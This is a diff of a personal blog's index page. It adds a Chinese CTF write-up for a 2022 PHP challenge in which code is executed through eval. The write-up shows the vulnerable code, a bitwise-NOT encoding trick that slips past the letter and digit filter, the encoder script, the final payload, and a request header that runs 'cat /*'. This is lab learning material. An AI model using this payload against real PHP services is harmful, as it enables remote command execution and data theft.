@@ -69,6 +69,79 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-第一周2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A82/" class="article-date">
+  <time class="dt-published" datetime="2025-01-13T02:50:23.000Z" itemprop="datePublished">2025-01-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A82/">第一周2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>[鹏城杯 2022]简单的php</p>
+<ol>
+<li>打开环境 发现php代码 如下：<?php
+show_source(__FILE__);
+ $code = $_GET['code'];
+ if(strlen($code) > 80 or preg_match('/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/is',$code)){
+     die(' Hello');
+ }else if(';' ===preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)){
+     @eval($code);
+
+ }</li>
+</ol>
+<p>?&gt; </p>
+<ol start="2">
+<li><p>代码审计 对于 “if(strlen($code) &gt; 80 or preg_match(‘&#x2F;[A-Za-z0-9]|&#39;|”|&#96;|\ |,|.|-|+|&#x3D;|/|\|&lt;|&gt;|$|?|^|&amp;||&#x2F;is’,$code))”<br>就是用get方式提交的code参数 字符串长度大于80 或者 code参数不能有任何字母和数字 还有” ‘等一些符号<br>这时我们发现 没有过滤 ~ 这个符号<br>这个时候就想到了取反</p>
+</li>
+<li><p>对于”(‘;’ &#x3D;&#x3D;&#x3D;preg_replace(‘&#x2F;[^\s()]+?((?R)?)&#x2F;‘, ‘’, $code))”<br>‘;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;[^\s()]+?((?R)?)&#x2F;‘, ‘’, $code)<br>[^\s()]+? 表示不匹配所有空白符和() 一次或多次<br>((?R)?) 表示循环匹配() 一次或0次<br>那么这题的解法就属于无参数的取反RCE，并且需要二维数组绕过<br>payload：system(end(getallheaders()));<br>构造取反二维数组拼接 [system]<a href="%5Bend%5D%5B0%5D(%5Bgetallheaders%5D%5B0%5D())">0</a></p>
+</li>
+<li><p>用上我们的取反代码 如下：</p>
+ <?php
+echo '~'.urlencode(~'system');
+echo "\n";
+echo '~'.urlencode(~'end');
+echo  "\n";
+echo '~'.urlencode(~'getallheaders');
+echo  "\n";
+echo '~'.urlencode(~'0');
+?>
+<p>最终payload：<br>[<del>%8C%86%8C%8B%9A%92][!%FF]([</del>%9A%91%9B]<a href="%5B~%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%5D%5B!%EF%BF%BD%5D()">!%FF</a>);</p>
+</li>
+<li><p>最后在burp抓包的get方式提交 code&#x3D;[<del>%8C%86%8C%8B%9A%92][!%FF]([</del>%9A%91%9B]<a href="%5B~%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%5D%5B!%EF%BF%BD%5D()">!%FF</a>);<br>在请求头中 随便加一个  eg：x:cat &#x2F;*<br>发现flag</p>
+</li>
+<li><p>总结：<br>这题就是无回显rce  无字母<br>可以用取反 异或等方式去写<br>用取反的时候 如果 ~ 没有被过滤的前提下</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A82/" data-id="cm5ui0zk8000beoui4djrdhbb" data-title="第一周2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-第一周1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/" class="article-date">
@@ -112,7 +185,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/" data-id="cm5ufzljj0000i0ui4zd82s17" data-title="第一周1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/" data-id="cm5ui0zk9000ceouicc3oexg1" data-title="第一周1" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -151,7 +224,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/12/sx/" data-id="cm5tjspmk0000aoui5qba1pne" data-title="sx" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/12/sx/" data-id="cm5ui0zk40009eoui7pgb7osn" data-title="sx" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -185,12 +258,12 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p><img src="/2025/01/09/hello-world/"><br>aaaaaa</p>
+        <p><img src="/text.png"><br>aaaaaa</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/12/mll/" data-id="cm5tb5xkz0000twui5cg7bmw1" data-title="mll" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/12/mll/" data-id="cm5ui0zk20006eoui6vhhcvgi" data-title="mll" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -224,13 +297,13 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        
+        <img src="/2025/01/12/io/text.png" class="" title="图片引用方法一">
 <p>应该可以了不</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/12/io/" data-id="cm5taioiz0000i0ui30ytdcfu" data-title="io" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/12/io/" data-id="cm5ui0zjz0003eouiehjogcn0" data-title="io" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -269,7 +342,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/12/sl/" data-id="cm5t9mnnr00006cui4ljv2l4p" data-title="sl" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/12/sl/" data-id="cm5ui0zk30008eoui1zlf81l7" data-title="sl" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -308,7 +381,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/12/lll/" data-id="cm5t98cn70000hwui6apm4krj" data-title="lll" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/12/lll/" data-id="cm5ui0zk10005eouiefxuffc5" data-title="lll" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -347,7 +420,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/12/kkk/" data-id="cm5t8wfig0000mwuiboos1gq4" data-title="kkk" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/12/kkk/" data-id="cm5ui0zk00004eouiefuhcyet" data-title="kkk" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -386,7 +459,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/12/www/" data-id="cm5t8it8m0000gsui3lih95nx" data-title="www" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/12/www/" data-id="cm5ui0zk5000aeouidds8fixw" data-title="www" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -425,46 +498,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/11/bzd/" data-id="cm5rjyfu600007wui6l2p0g62" data-title="bzd" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-huhu" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/10/huhu/" class="article-date">
-  <time class="dt-published" datetime="2025-01-10T01:56:14.000Z" itemprop="datePublished">2025-01-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/10/huhu/">huhu</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><img src="https://github.com/wbwb-rgb/wbwb-rgb.github.io/blob/main/c4034f46-0296-450b-9215-115847e35591_w1024_h768.jpeg"><br>tppppppppp</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/10/huhu/" data-id="cm5q3zolh0000fouib66dgqfa" data-title="huhu" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/11/bzd/" data-id="cm5ui0zjr0000eoui1h9c3kpj" data-title="bzd" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -512,6 +546,10 @@
       <ul>
         
           <li>
+            <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A82/">第一周2</a>
+          </li>
+        
+          <li>
             <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/">第一周1</a>
           </li>
         
@@ -525,10 +563,6 @@
         
           <li>
             <a href="/2025/01/12/io/">io</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/12/sl/">sl</a>
           </li>
         
       </ul>
